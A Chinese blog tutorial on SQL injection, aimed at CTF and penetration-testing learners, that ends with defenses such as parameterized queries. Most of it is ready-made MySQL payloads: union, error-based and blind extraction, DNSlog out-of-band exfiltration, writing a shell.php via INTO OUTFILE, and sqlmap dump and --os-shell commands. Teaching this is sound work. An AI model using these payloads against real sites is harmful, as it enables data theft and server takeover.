---
title: SQL注入漏洞
date: 2026-05-23 00:20:00
cover: https://img.jasmine-iris.top/posts/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/cover.webp
categories:
  - Web安全
  - SQL
tags:
  - SQL注入
  - 渗透测试
  - CTF
description: SQL注入漏洞的原理、分类（联合/报错/布尔/时间盲注）、常见绕过技巧与防御方法
---
# 一、什么是 SQL 注入
SQL注入是一种常见的网络安全漏洞和攻击方式，它利用应用程序对用户输入数据的处理不当，使得攻击者能够在执行SQL查询时插入恶意的SQL代码。通过成功注入恶意代码，攻击者可以执行未经授权的数据库操作，获取敏感信息、篡改数据甚至完全破坏数据库。

SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）里，不是输正常内容，而是偷偷塞一段 SQL 数据库命令，想骗数据库执行，达到偷数据、删数据甚至改网站的目的。

---

# 二、SQL 注入分类
常见的注入点：

```plain
?str=xxx
?test=xxx
?idstr=xxx
?id=xxx
```

## 1. union 注入
### 1.1 概念：      
union查询注入是最基础的注入。在SQL中， UNION 操作符用于合并两个或多个 SELECT 语句的结果。union 查询注入利用 UNION 关键字可以追加一条或者多条额外的 SELECT 查询，并将结果追加到原始查询中。联合查询会“纵向”拼接两个或多个 SELECT 语句的结果.

---

### 1.2 适用条件：    
1. 网页存在注入点，有回显。
2. 需要满足union语句要求，即：

union前后两个select的结果集应具有相同列数；

union前后两个select的结果集对应列应是相同数据类型

---

### 1.3 注入步骤：   
1. 首先判断是否存在注入点及注入的类型。

```plain
https://地址/?id=1
通过修改id的值判断是否存在注入点
```



2. 使用ORDER BY 查询列数 

```sql
https://地址/?id=1 order by 1
修改 order by 后面的数据
不报错代表存在，报错即为最大列数
```



3. 判断回显的位置

```sql
?id=-1 union select 1,2,3
注意：这里的id不可以填1，因为1是真实存在的，而我们不想查到真实存在的数据，所以要改成一个不存在的数：-1
```



4. 获取数据库名

以三个字段数为例：

```sql
?id=-1 union select 1,2,database()		//查询当前数据库
?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata		// 查询所有数据库名
```



5. 获取当前数据库中的所有表名

```sql
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='数据库名'
```



6. 获取当前数据库的表中的所有字段名 

```sql
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='数据库名' and table_name='表名'
```

where table_schema='数据库名' and table_name='表名'

简化写法(了解)：

where concat(table_schema,'.',table_name)='数据库名.表名'



7. 获取当前数据库中，字段里的数据。

```sql
?id=-1 union select 1,2,目标字段 from 目标表名 limit 0,1

// 如果想要数据一一对应，使用concat将多个字段内容合并为输出
// 例如：
?id=-1 union select 1,2,concat(username, ':', password) from users limit 0,1
```

---

### 1.4 总结
1. union 注入要求存在注入点，有回显
2. 需要满足 union 语句要求

---

## 2. 报错注入
### 2.1 概念 
报错注入是利用网站的报错信息来带出我们想要的信息，就是在错误信息中执行 sql语句

---

### 2.2 使用条件
考虑到成功率和时间成本比 union成本高，需要数据库有错误信息，⼀般在union条件不能实施的时候，在查询，新增，修改能都使用。

---

### 2.3 报错注入命令
该部分参考：[https://cloud.tencent.com/developer/article/2159753](https://cloud.tencent.com/developer/article/2159753)

#### 2.3.1 groupby重复键冲突
利⽤count()、rand()、floor()、groupby这⼏个特定的函数结合在⼀起产⽣的注⼊漏洞

```sql
?id=1 and (select 1 from (select count(*),concat(0x5e,(目标查询语句),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
```

核心是利用 `count(*)` + `rand()` + `group by` 触发主键重复错误，把 `concat` 包裹的目标数据（如版本号、表名）带出，无需页面回显也能拿到数据（当 union 被禁用时）。

1. 为什么报错？

MySQL 做 group by 时：

+ 先算 `floor(rand(0)*2)` → 得到 0 或 1
+ 把结果插入**临时表**
+ 插入时又算了一次 `rand(0)`
+ 两次结果不一样 → 出现**重复键**
+ 直接报错：**Duplicate entry**（重复条目）
+ 关键：**报错的时候，会把我们拼接的【数据】一起输出来！**数据就这样拿到了。
2. 为什么 rand(14) 更好？

`rand(14)` 只需要 2 条数据就能触发冲突，`rand(0)` 需要 3 条数据才会报错。

3. 如何使用

想查什么，就把 `version()` 换成：

+ `database()` → 查库名
+ `table_name` → 查表名
+ `column_name` → 查字段

示例：

```sql
?id=1 and (select 1 from (select count(*),concat(0x5e,(select version() from information_schema.tables limit 0,1),0x5e,floor(rand(0)*2))x from information_schema.tables group by x)a)
```

把想要的数据（这里是 `version()`）爆在报错信息里。

---

#### **2.3.2 xpath报错**
MySQL 有两个 XML 函数：extractvalue ()、updatexml ()

只要给它不符合 XPath 语法的字符串**，**它就会报错，并把错误内容直接显示出来。

##### ① 原理拆解
```plain
extractvalue( XML文档, XPath路径 )    # 专门解析 XML 的函数
updatexml(   XML文档, XPath路径, 新值 ) # 修改 XML 数据的函数
```

这两个函数的**第二个参数期望是合法的 XPath 路径**。如果你传了非法字符（如 `^`、`\`、`~`），函数就会报错，而且**报错信息会把第二个参数原样回显**。

所以攻击思路是：把 SQL 查询结果拼进第二个参数 → 函数报错 → 数据通过报错信息"吐"出来。

```plain
extractvalue(1, concat(0x5e, (select database()), 0x5e))
                              └──────┬──────┘
                            你的查询结果被夹在 ^ 中间
                                        ↓ 函数报错，错误信息回显该参数
XPATH syntax error: '^数据库名^'
```

**关键认知**：

+ `0x5e`（^）、`0x5c`（\）不是"绕过"，是**故意制造非法 XPath**，逼函数报错
+ `(select database())` 可以换成任何查询语句
+ 模板不能瞎套：这个机制是 MySQL **独有**的，换数据库这套就失效

---

##### ② 报错注入跨数据库对比
| 数据库 | 触发机制 | 典型函数 |
| --- | --- | --- |
| MySQL | XPath 解析报错 | `extractvalue`、`updatexml`、`floor()` |
| Oracle | 特殊包函数触发 | `CTXSYS.DRITHSX.SN` |
| MSSQL | 类型转换报错 | `CONVERT`、`CAST` |
| PostgreSQL | 类型转换报错 | `CAST(... AS int)` |


**思路通用（让数据库把数据带进错误信息），触发方式不通用。套错模板直接失败。**

---

##### extractvalue()
```plain
?id=1 and extractvalue(1, concat(0x5c, (查询语句), 0x5c))
```

##### updatexml()
```plain
?id=1 and updatexml(1, concat(0x5e, (查询语句), 0x5e), 1)
```

+ 注意：

updatexml() 仅能获取返回32位字符，对于长字符串需要分批次获取：

```plain
' or updatexml(1,concat(0x5e,(select concat(name,':',substring(password,1,16)) from users limit 0,1),0x5e),1) or '
' or updatexml(1,concat(0x5e,(select concat(name,':',substring(password,17)) from users limit 0,1),0x5e),1) or '
```

---

##### ③ 攻击语句
```sql
INSERT INTO messages(字段1, 字段2, 字段3) VALUES ('', '', ' 攻击语句 '); 

// 例如：
$sql = "INSERT INTO messages(`uname`,`title`,`content`) VALUES ('','','' or extractvalue(1, concat(0x5c, database(), 0x5c)) or '')";
```

+ 获得数据库名字

```sql
' or extractvalue(1, concat(0x5c, (select database() from information_schema.tables limit 0,1), 0x5c)) or '
' or updatexml(1, concat(0x5e, (select database() from information_schema.tables limit 0,1), 0x5e), 1) or '
```

+ 获得表名

```sql
' or extractvalue(1, concat(0x5c, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5c)) or '
' or updatexml(1, concat(0x5e, (select group_concat(table_name) from information_schema.tables where table_schema=库名), 0x5e), 1) or '
```

+ 获得表的字段

```sql
' or extractvalue(1, concat(0x5c, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5c)) or '
' or updatexml(1, concat(0x5e, (select group_concat(column_name) from information_schema.columns where table_schema=库名 and table_name=表名), 0x5e), 1) or '
```

+ 获得数据

```sql
' or extractvalue(1, concat(0x5c, (select concat(字段1,':',字段1) from 表名 limit 0,1), 0x5c)) or '
' or updatexml(1, concat(0x5e, (select concat(字段2,':',密码2) from 表名 limit 0,1), 0x5e), 1) or '
```

---

## 3. 布尔盲注
### 3.1 概念
当改变浏览器传给后台SQL的参数后，浏览器没有显示对应内容也没有显示报错信息时，⽆法使⽤ union联合查询注⼊与报错注⼊，这时候可以试试看能否使⽤布尔注⼊

---

### 3.2 使用条件
⼀般情况下，当带⼊参数为真和假时，页面会有不同的反映，比如有无显示也是⼀种不同，布尔盲注就是根据这种不同来反推我们输⼊的条件是真还是假。

---

### 3.3 注入步骤
示例参数：库名 data、表名 users、字段 name、password

1. 判断是否存在布尔注入  
使用布尔条件，绕过真假不同条件的时候，页面有变化，可以考虑使用布尔注入。

```sql
?id=2 and 1=1
?id=2 and 1=2
```

---

2. 猜解数据库名

a. 判断库名长度

```sql
?id=1 and length(database())<数值
?id=1 and length(database())>数值
?id=1 and length(database())=数字
```

示例（假设数据库名为 data）：

```sql
?id=1 and length(database())<5
?id=1 and length(database())>2
?id=1 and length(database())=4		// true 说明数据库名的长度为4
```



b. 逐字符猜库名  
可以使用ASCII码，甄别出数据库每一个字符

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQL注入漏洞/1787302165733_i5xm7t.webp)

数据库的名字⼀般都是a-z,A-Z组成，也可能出现数字、下划线等字符

```sql
?id=1 and ascii(substr(database(),第几位,1))<ASCII值
?id=1 and ascii(substr(database(),第几位,1))>ASCII值
?id=1 and ascii(substr(database(),第几位,1))=ASCII值
/*
substr(database(), 第几位, 1)：
表示从database()返回的字符串中，“第几位”，就是截取第几个字符。
比如 data 中，d就是第一位
*/

?id=1 and ascii(substr(database(),1,1))<123	// 122为z
?id=1 and ascii(substr(database(),1,1))>64	// 65为A
```

示例（库名：data）：

```sql
?id=1 and ascii(substr(database(),1,1))<123	//true
?id=1 and ascii(substr(database(),1,1))>64	//true
?id=1 and ascii(substr(database(),1,1))>100	//true
?id=1 and ascii(substr(database(),1,1))>110	//false

?id=1 and ascii(substr(database(),1,1))=100	//true 100对应d
?id=1 and ascii(substr(database(),2,1))=97	//true 97对应a
?id=1 and ascii(substr(database(),3,1))=116 //true 116对应t
?id=1 and ascii(substr(database(),4,1))=97	//true 97对应a
// 合起来库名就是data
```



c. 验证库名

```sql
?id=1 and database()='库名'
```

示例（库名：data）：

```sql
?id=1 and database()='data'
```

---

3. **猜解库内数据表**

a. 判断表数量

```sql
?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())<数值
?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())<数值
?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())=数量	//知道有几个表
```



b. 判断表名长度

```sql
// 判断单张表
?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))<数值
?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))<数值
?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 数字

// 判断多张表：
?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1))=长度
// 偏移量：= 第几个表 / 第几个字段，从 0 开始数！
//比如：
-- 第1张表
?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 0,1))=长度
-- 第2张表
?id=1 and length((select table_name from information_schema.tables where table_schema=库名 limit 1,1))=长度
```

示例（表名：users）：

```sql
?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))<10
?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1))<5
?id=1 and length((select table_name from information_schema.tables where table_schema=data limit 0,1)) = 5
```



c. 逐字符猜解表名

```sql
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))<ASCII值	//先判断范围
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))>ASCII值	
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 偏移量,1),第几位,1))=ASCII值	//再确定字符
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 偏移量,1),第几位,1))=ASCII值
// 直接填爆出来的库名或者database()都可以
```

示例（表名：users，以第一个字符 u 为例）：

```sql
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<100
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<120
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117	//true 117对应u 说明表名中有一个字母是u
```

---

4. **猜解表内字段**

a.  判断字段总数

```sql
?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='表名')=数值
```

更改数值，挨个测试，表名填自己想查询的表名。

示例（假如 users 表里面有两个字段分别是 username 和  password）：

```sql
?id=1 and (select count(column_name) from information_schema.columns where table_schema=data and table_name='users')=2
```



b. 判断字段名长度

```sql
?id=1 and length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1))=长度
```

示例（查第一个字段名的长度）：

```sql
?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1))<10
?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1))<1
?id=1 and length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1))=8 // 第一个字段的长度是8个字符
```



c. 逐字符猜字段名

```sql
?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 偏移量,1),第几位,1))=ASCII值
```

示例（以 username 为例，查第一个字符 u）：

```sql
?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))<100
?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))<110
?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))=117
```

---

5. **猜解表中数据**

a. 判断数据长度

```sql
?id=1 and (select LENGTH(字段名) from 表名 limit 0,1)=长度
```

示例：假设获得username 字段第一行数据的内容长度为 2

```plain
?id=1 and (select LENGTH(username) from users LIMIT 0,1)=5
```



b. 逐字符猜数据内容

```sql
?id=1 and ascii(substr((select 字段名 from 表名 limit 偏移量,1),第几位,1))=ASCII值
```

示例：假设获得user字段第一行数据第一个字符内容

```sql
?id=1 and ascii(substr((select name from users limit 0,1),1,1))=97
?id=1 and ascii(substr((select name from users limit 0,1),2,1))=100
```

---

## 4. 延迟盲注
### 4.1 概念
也称延时注入、时间注入等，这种注入方式在传给后台的参数中，设置了一个if语句，当条件为真时执行sleep语句，条件为假时无执行语句，然后根据浏览器的响应时间来推测sleep语句是否被执行，进而推测if条件是否为真。  
延时盲注与布尔盲注的核心思想都是通过浏览器两种不同的响应来推测输入的条件的真假，布尔盲注是条件真假时页面会有不同显示，延时盲注则是显示结果真假只能从响应时间上进行推测。

---

### 4.2 使用条件
union、报错、布尔等搞不定的时候才考虑，效率极低。

---

### 4.3 注入步骤
示例参数：库名 data、表名 users、字段 name、password

1. 测试延时注入点

```sql
?id=1 and sleep(秒数)
```

示例：

```sql
?id=1 and sleep(5)
```

---

2. 猜数据库名

a. 判断库名长度

```sql
?id=1 and if(length(database())=数值,sleep(5),1)
```

示例：

```sql
?id=1 and if(length(database())=4,sleep(5),1)
```



b. 逐字符猜库名

```sql
?id=1 and if(ascii(substr(database()),位数,1)=ASCII值,sleep(5),1)
```

示例：

```sql
?id=1 and if(ascii(substr(database(),1,1))=100,sleep(5),1)
?id=1 and if(ascii(substr(database(),2,1))=97,sleep(5),1)
```

---

3. 猜数据表名

a. 判断表名长度

```sql
?id=1 and if(length((select table_name from information_schema.tables where table_schema=库名 limit 序号,1))=数值,sleep(5),1)
```

示例（库名为 data，长度为 4）：

```sql
?id=1 and if(length((select table_name from information_schema.tables where table_schema=data limit 0,1))=4,sleep(5),1)
```



b. 逐字符猜表名

```sql
?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=库名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
```

示例：

```sql
?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=data limit 0,1),1,1))=117,sleep(5),1)
```

---

4. 猜字段名

a. 判断字段名长度

```sql
?id=1 and if(length((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1))=数值,sleep(5),1)
```

示例

```plain
?id=1 and if(length((select column_name from information_schema.columns where table_schema=data and table_name='users' limit 0,1))=4,sleep(5),1)
```



b. 逐字符猜字段

```sql
?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=库名 and table_name=表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
```

示例：

```sql
?id=1 and if(ascii(substr((select column_name from information_schema.columns where table_schema=data and table_name='users' limit 0,1),1,1))=110,sleep(5),1)
```

---

5. 猜表内数据

```sql
?id=1 and if(ascii(substr((select 字段名 from 表名 limit 序号,1),位数,1))=ASCII值,sleep(5),1)
```

示例：

```sql
?id=1 and if(ascii(substr((select name from users limit 0,1),1,1))=97,sleep(5),1)
```

注解

+ 序号：表 / 字段排序，从 0 开始计数
+ 位数：字符串截取位置
+ sleep (5)：条件成立延迟 5 秒响应

---

## 5. DNSlog 盲注
### 5.1 概念
DNSlog盲注就是通过load_file函数发起请求，然后去DNSlog平台接收数据，需要用到load_file函数，就是需要用到root用户读写文件的功能。

---

### 5.2 查看配置
```plain
show VARIABLES like 'secure_file_priv'
```

+ secure_file_priv=null 不允许导入导出
+ secure_file_priv=tmp/ 只能在tmp目录
+ secure_file_priv= 无限制

---

### 5.3 有权限直接读取
1. 读取路径：

```sql
?id=-1 union select 1,2,3,@@datadir
```



2. 读取文件：

```sql
?id=-1 union select 1,2,3,load_file('文件完整路径')
```

示例：（\ 转义）

```sql
?id=-1 union select 1,2,3,load_file('C:\\phpStudy\\WWW\\config.php')
```



3. 写入文件：

```sql
?id=-1 union select 1,2,3,'写入内容' into outfile '文件保存路径'
```

示例：

```sql
?id=-1 union select 1,2,3,'<?php phpinfo();?>' into outfile 'C:\\phpStudy\\WWW\\shell.php'
?id=-1 union select 1,2,3,'<?php phpinfo();?>' into outfile 'C:/phpStudy/WWW/shell.php'
```

---

### 5.4 采用 DNSlog 带外获取
[http://dnslog.cn/](http://dnslog.cn/)  
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQL注入漏洞/1787302168195_8n2q68.webp)

#### 实操：
点击 Get SubDomain 获取域名 xgikzx.dnslog.cn  
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/SQL注入漏洞/1787302169780_2mnf0r.webp)

1. 查当前库名

```sql
?id=1 and load_file(concat('//',(select database()),'.获取的域名/123'))
```

注入后，点击网站的 Refresh Record 就会返回数据库名。

2. 查表名

```sql
// 获取第一张表
?id=1 and load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.获取的域名/123'))
// 获取第二张表
?id=1 and load_file(concat('//',(select table_name from information_schema.tables where table_schema=database() limit 1,1),'.获取的域名/123'))
```

---

## 6. 二次注入
### 6.1 概念
二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。

### 6.2 实战
1. 碰撞用户，确认用户名 admin 存在
2. 注册用户名：`admin'#`
3. 修改密码时执行SQL：

```sql
update users set password=md5('123456') where name='admin'#'
```

`admin'#`的密码没变，修改的是`admin`的密码

---

## 7. 堆叠注入
### 7.1 概念
在SQL数据库中，每条语句是以;分开的，堆叠注入就是一次性注入并执行多条语句（多语句之间以分号隔开）的注入方式。  
与 union 对比：union 联合查询注入执行的语句是有限的，可以用来执行查询语句。堆叠注入可以执行任意语句，比如增删改查。

### 7.2 实战
1. 获取库名、表名、字段名、数据等信息
2. 构造攻击语句：

```sql
?id=2;insert into users (name,password) values('admin',md5('admin'));
```

---

# 三、SQLMap工具运用
+ 官⽹：[https://sqlmap.org/](https://sqlmap.org/)
+ 作⽤： sqlmap是⼀个开源的渗透测试⼯具，它可以⾃动化检测和利⽤SQL注⼊漏洞并接管数据库服务器。它有⼀个强⼤的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项。注意：kali⾃带

## 1. 常用命令
```sql
//检测漏洞
sqlmap -u 'http://xxx?id=2'

//查询当前数据库
sqlmap -u 'url' --current-db

//查当前库有哪些表名
sqlmap -u 'url' -D 库名 --tables

//某表有哪些字段
sqlmap -u 'url' -D 库名 -T 表名 --columns

//列出数据
sqlmap -u 'url' -D 库名 -T 表名 -C 字段 --dump


//其他：
//执行sql
sqlmap -u 'url' --sql-shell
//执行系统命令
sqlmap -u 'url' --os-shell
//读取文件
sqlmap -u 'url' --file-read "d:/e.txt"
```

## 2. 绕过WAF
```plain
sqlmap -u 'url' --tamper=passdog.py
```

---

# 四、SQL注入绕过
## 1. 提交方式更改
GET 改 POST

安全狗（WAF 防御）

## 2. 特殊字符绕过
```plain
database/**/()
```

## 3. 参数污染
```plain
?id=1/**&id=-1 union select 1,2,3,4%23*/
```

## 4. 数据库特性绕过
```plain
/*!44509select*/
```

---

# 五、 SQL注入防护
1. **过滤**：限制输入长度、识别拦截 SQL 恶意关键字（如 union、select、or 等）

> 缺点：关键字过滤容易被绕过，不是最可靠手段。
>

2. **转义**：把用户输入当做普通文本处理，对单引号`'`等特殊符号进行转义，破坏注入语法。
3. **数据库权限控制、敏感数据加密**
+ 最小权限原则：Web 账号不给高权限，禁止 drop、alter 等高风险操作；
+ 密码等敏感信息加密存储，就算被拖库也不会直接泄露明文。
4. *_预编译（参数化查询）__**⭐**__最核心、最优方案_*

> 将 SQL 语句结构和用户输入完全分开，输入永远只被当作参数数据，不会被解析成 SQL 代码，从根源杜绝注入。
>

---

## 六、总结
1. 报错注入是在 union 注入在查询不到的情况下，才使用
2. 在使用报错注入的时候要关注报错注入的函数extractvalue()、updatexml()

